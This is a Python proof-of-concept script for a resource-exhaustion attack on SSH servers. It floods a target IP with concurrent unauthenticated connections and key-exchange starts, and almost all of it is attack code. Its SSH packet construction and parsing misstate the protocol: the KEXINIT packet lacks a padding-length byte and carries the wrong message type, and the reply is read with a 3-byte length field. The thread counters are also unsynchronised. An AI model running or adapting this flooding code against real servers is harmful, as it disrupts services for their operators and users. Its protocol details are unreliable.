"""
Proof-of-Concept: SSH Unauthenticated Key Exchange Resource Exhaustion (RFC 4251 Section 9.3.5)

This script demonstrates how an attacker can exhaust server resources by initiating
multiple unauthenticated key exchange processes. Each connection forces the server
to perform CPU-intensive Diffie-Hellman computations and memory allocation for session keys.
"""
import socket
import threading
import sys
import time
from typing import List, Tuple

# SSH Protocol Constants
SSH_BANNER = b'SSH-2.0-PythonPoC\r\n'
MSG_KEXINIT = 20
MSG_NEWKEYS = 21

class SSHKexExhaustionClient:
    """
    Simulates an attacker initiating multiple unauthenticated key exchanges.
    """
    def __init__(self, target_ip: str, target_port: int, num_connections: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_connections = num_connections
        self.successful_handshakes = 0
        self.failed_handshakes = 0
        
    def _send_ssh_banner(self, sock: socket.socket) -> bool:
        """Send SSH banner to initiate connection."""
        try:
            sock.sendall(SSH_BANNER)
            return True
        except Exception as e:
            print(f"[!] Failed to send banner: {e}")
            return False
    
    def _receive_ssh_banner(self, sock: socket.socket) -> bool:
        """Receive server's SSH banner."""
        try:
            data = b''
            while not data.endswith(b'\r\n'):
                chunk = sock.recv(1024)
                if not chunk:
                    return False
                data += chunk
            print(f"[+] Received server banner: {data.decode().strip()}")
            return True
        except Exception as e:
            print(f"[!] Failed to receive banner: {e}")
            return False
    
    def _initiate_kex(self, sock: socket.socket) -> bool:
        """
        Initiate Key Exchange by sending KEXINIT packet.
        This forces the server to allocate resources for DH computation.
        """
        try:
            # Minimal KEXINIT payload (simplified for PoC)
            # In reality, this would contain supported key exchange algorithms
            kexinit_payload = b'\x00\x00\x00\x3c' + b'\x20' * 60  # Simplified KEXINIT
            sock.sendall(kexinit_payload)
            return True
        except Exception as e:
            print(f"[!] Failed to send KEXINIT: {e}")
            return False
    
    def _handle_server_kex(self, sock: socket.socket) -> bool:
        """
        Receive server's KEXINIT and perform minimal DH exchange.
        This is where the server performs CPU-intensive operations.
        """
        try:
            # Read server's KEXINIT
            header = sock.recv(4)
            if len(header) < 4:
                return False
            msg_len = int.from_bytes(header[:3], 'big')
            msg_type = header[3]
            
            if msg_type != MSG_KEXINIT:
                print(f"[-] Expected KEXINIT, got {msg_type}")
                return False
                
            server_kexinit = sock.recv(msg_len)
            print("[+] Received server KEXINIT. Server is now performing DH computations...")
            
            # In a real attack, we would continue the handshake to force full DH exchange.
            # For PoC purposes, simply initiating and dropping forces partial resource allocation.
            return True
        except Exception as e:
            print(f"[!] Error during KEX: {e}")
            return False
    
    def _execute_connection(self) -> bool:
        """
        Execute a single unauthenticated key exchange attempt.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5.0)  # Short timeout to prevent hanging
        
        try:
            sock.connect((self.target_ip, self.target_port))
            
            if not self._send_ssh_banner(sock):
                return False
                
            if not self._receive_ssh_banner(sock):
                return False
                
            if not self._initiate_kex(sock):
                return False
                
            if self._handle_server_kex(sock):
                self.successful_handshakes += 1
                print(f"[+] Connection #{self.successful_handshakes} forced server KEX initiation.")
                return True
            else:
                self.failed_handshakes += 1
                return False
        except socket.timeout:
            self.failed_handshakes += 1
            print("[-] Connection timed out.")
        except Exception as e:
            self.failed_handshakes += 1
            print(f"[-] Connection failed: {e}")
        finally:
            sock.close()
    
    def run_attack(self):
        """
        Launch multiple concurrent unauthenticated key exchange attempts.
        """
        threads = []
        start_time = time.time()
        
        print(f"[*] Starting SSH KEX Exhaustion Attack against {self.target_ip}:{self.target_port}")
        print(f"[*] Initiating {self.num_connections} concurrent unauthenticated handshakes...")
        
        for i in range(self.num_connections):
            t = threading.Thread(target=self._execute_connection)
            threads.append(t)
            t.start()
            # Small delay to prevent overwhelming local network stack
            time.sleep(0.1)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
            
        elapsed_time = time.time() - start_time
        print(f"\n[+] Attack completed in {elapsed_time:.2f} seconds.")
        print(f"[+] Successful KEX initiations: {self.successful_handshakes}")
        print(f"[-] Failed connections: {self.failed_handshakes}")
        
        if self.successful_handshakes > 0:
            print("\n[*] Observation: The server allocated resources for each unauthenticated handshake.")
            print("    If the server lacks rate limiting or proof-of-work, this can lead to resource exhaustion.")

